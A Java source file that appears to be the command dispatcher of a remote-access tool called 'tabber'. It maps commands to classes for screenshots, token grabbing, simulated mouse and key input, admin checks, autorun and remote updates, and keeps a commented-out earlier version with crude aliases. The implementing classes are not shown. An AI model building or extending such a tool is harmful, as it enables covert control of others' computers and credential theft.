package InvisibleCat.tabber.command;

import InvisibleCat.tabber.App;
import InvisibleCat.tabber.command.commands.*;

import java.awt.*;
import java.util.HashMap;

public class CommandFactory {

    private final HashMap<String, Command> commandMap;


    public CommandFactory() {
        this.commandMap = new HashMap<>();
        try {
            commandMap.put("tab",new Tab("Tabbed " + App.getInfo()));
            commandMap.put("stop", new Stop());
            commandMap.put("ss", new ScreenShot("SSing " + App.getInfo()));
            commandMap.put("auto", new Auto("Auto mode info for: " + App.getInfo()));
            commandMap.put("admin", new Admin("Running admin check on " + App.getInfo() + "..."));
            commandMap.put("token",new Token("Attempting to get tokens..."));
            commandMap.put("mouse", new MouseMove("Sending mouse move to " + App.getInfo() + "..."));
            commandMap.put("click",new Click("Sending click to " + App.getInfo() + "..."));
            commandMap.put("update", new Update("Updating " + App.getInfo() + "..."));
            commandMap.put("sendKey", new KeySender());
            commandMap.put("ip", new Ip("Setting ip for user"));
            commandMap.put("help", new Help());
            commandMap.put("autorun", new AutoRun());
            commandMap.put("notify", new Notify("Sending notification to " + App.getInfo()));
            commandMap.put("kick", new Kick());
        } catch (AWTException e) {
            e.printStackTrace();
        }

    }


    public Command create(String input) throws AWTException {
        if(commandMap.containsKey(input)) {
            return commandMap.get(input);
        }

//        if (input.equalsIgnoreCase("tab")) {
//            if (commandMap.containsKey("tab")) {
//                return commandMap.get("tab");
//            }
//            commandMap.put("tab",new Tab("Tabbed " + App.getInfo()));
//            return commandMap.get("tab");
//
//        }
//        if (input.equalsIgnoreCase("stop")) {
//            if (commandMap.containsKey("stop")) {
//                return commandMap.get("stop");
//            }
//            commandMap.put("stop", new Stop());
//            return commandMap.get("stop");
//        }
//        if (input.equalsIgnoreCase("ss")) {
//            if (commandMap.containsKey("ss")) {
//                return commandMap.get("ss");
//            }
//            commandMap.put("ss", new ScreenShot("SSing " + App.getInfo()));
//            return commandMap.get("ss");
//        }
//        if (input.equalsIgnoreCase("auto")) {
//            if (commandMap.containsKey("auto")) {
//                return commandMap.get("auto");
//            }
//            commandMap.put("auto", new Auto("Auto mode info for: " + App.getInfo()));
//            return commandMap.get("auto");
//        }
//        if (input.equalsIgnoreCase("admin")) {
//            if (commandMap.containsKey("admin")) {
//                return commandMap.get("admin");
//            }
//            commandMap.put("admin", new Admin("Running admin check on " + App.getInfo() + "..."));
//            return commandMap.get("admin");
//        }
//        if (input.equalsIgnoreCase("token")) {
//            if (commandMap.containsKey("token")) {
//                return commandMap.get("token");
//            }
//            commandMap.put("token",new Token("Attempting to get tokens..."));
//            return commandMap.get("token");
//
//        }
//        if (input.equalsIgnoreCase("mouse")) {
//            if (commandMap.containsKey("mouse")) {
//                return commandMap.get("mouse");
//            }
//            commandMap.put("mouse", new MouseMove("Sending mouse move to " + App.getInfo() + "..."));
//            return commandMap.get("mouse");
//        }
//        if (input.equalsIgnoreCase("click")) {
//            if (commandMap.containsKey("click")) {
//                return commandMap.get("click");
//            }
//            commandMap.put("click",new Click("Sending click to " + App.getInfo() + "..."));
//            return commandMap.get("click");
//
//        }
//        if (input.equalsIgnoreCase("window")) {
//            if (commandMap.containsKey("window")) {
//                return commandMap.get("window");
//            }
//            commandMap.put("window", new CurrentWindow());
//            return commandMap.get("window");
//
//        }
//        if (input.equalsIgnoreCase("update")) {
//            if (commandMap.containsKey("update")) {
//                return commandMap.get("update");
//            }
//            commandMap.put("update", new Update("Updating " + App.getInfo() + "..."));
//            return commandMap.get("update");
//
//        }
//        if (input.equalsIgnoreCase("sendKey")) {
//            if (commandMap.containsKey("sendKey")) {
//                return commandMap.get("sendKey");
//            }
//            commandMap.put("sendKey", new KeySender());
//            return commandMap.get("sendKey");
//        }
//        if (input.equalsIgnoreCase("help")) {
//            if (commandMap.containsKey("help")) {
//                return commandMap.get("help");
//            }
//            commandMap.put("help", new Help());
//            return commandMap.get("help");
//
//        }
//        if (input.equalsIgnoreCase("autorun")) {
//            if (commandMap.containsKey("autorun")) {
//                return commandMap.get("auto");
//            }
//            commandMap.put("autorun", new AutoRun());
//            return commandMap.get("autorun");
//
//        }
//        if (input.equalsIgnoreCase("kys") || input.equalsIgnoreCase("stfu")) {
//            if (commandMap.containsKey("kick")) {
//                return commandMap.get("kick");
//            }
//            commandMap.put("kick", new Kick());
//            return commandMap.get("kick");
//        }
//        if (input.equalsIgnoreCase("note") || input.equalsIgnoreCase("notify")) {
//            if (commandMap.containsKey("note")) {
//                return commandMap.get("note");
//            }
//            commandMap.put("note", new Notify("Sending notification to " + App.getInfo()));
//            return commandMap.get("note");
//        }

        return new NoOp();
    }

}

